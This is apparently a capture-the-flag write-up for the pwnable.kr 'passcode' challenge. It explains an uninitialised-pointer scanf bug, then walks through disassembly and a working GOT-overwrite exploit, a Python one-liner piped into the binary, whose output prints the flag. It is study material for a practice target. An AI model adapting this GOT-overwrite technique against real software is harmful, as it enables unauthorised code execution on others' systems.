# pwnable games

## passcode

```c
void login(){
    int passcode1;
    int passcode2;

    printf("enter passcode1 : ");
    scanf("%d", passcode1);
    fflush(stdin);

    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
    printf("enter passcode2 : ");
        scanf("%d", passcode2);

    printf("checking...\n");
    if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
        exit(0);
        }
}

void welcome(){
    char name[100];
    printf("enter you name : ");
    scanf("%100s", name);
    printf("Welcome %s!\n", name);
}

int main(){
    printf("Toddler's Secure Login System 1.0 beta.\n");

    welcome();
    login();
    // something after login...
    printf("Now I can safely trust you that you have credential :)\n");
    return 0;
}
```

`scanf("%d", passcode1);` the right implementation >> `scanf("%d", &passcode1);`

so by this way we scan the value into the value of passcode one insted of its address.
but this could be udfel for us.

we could overwrite passcode1 with welcome() input but we can't write any value in passcode2

so we can easly overwrite passcode1 with GOT addr from fflush()

```sh
Dump of assembler code for function fflush@plt:
   0x08048430 <+0>: jmp    DWORD PTR ds:0x804a004
   0x08048436 <+6>: push   0x8
   0x0804843b <+11>: jmp    0x8048410
End of assembler dump.
```

and write the address of `system("/bin/cat flag");` to it

```sh
    ...........................
   0x080485d7 <+115>: mov    DWORD PTR [esp],0x80487a5
   0x080485de <+122>: call   0x8048450 <puts@plt>
   0x080485e3 <+127>: mov    DWORD PTR [esp],0x80487af
   0x080485ea <+134>: call   0x8048460 <system@plt>
    ...........................
```

the above block is the assembly of:

```c
    printf("Login OK!\n");
    system("/bin/cat flag");
```

now we got GOT address `0x804a004` and our code address flow to cat flag `0x080485d7` but we need it as integer **134514135** for scanf `scanf("%d", passcode1);`

finally our exploit:

```sh
passcode@pwnable:~$ python -c 'print 96*"A" + "\x04\xa0\x04\x08\n" +"134514135\n"'|./passcode

Toddler's Secure Login System 1.0 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�!
enter passcode1 : Login OK!
Sorry mom.. I got confused about scanf usage :(
Now I can safely trust you that you have credential :)
```

this what we did:

```md
scanf("%d", 0x804a004); << 134514135
0x804a004               // the address of GOT from calling fflush()
134514135 == 0x080485d7 // the address of our code flow
```
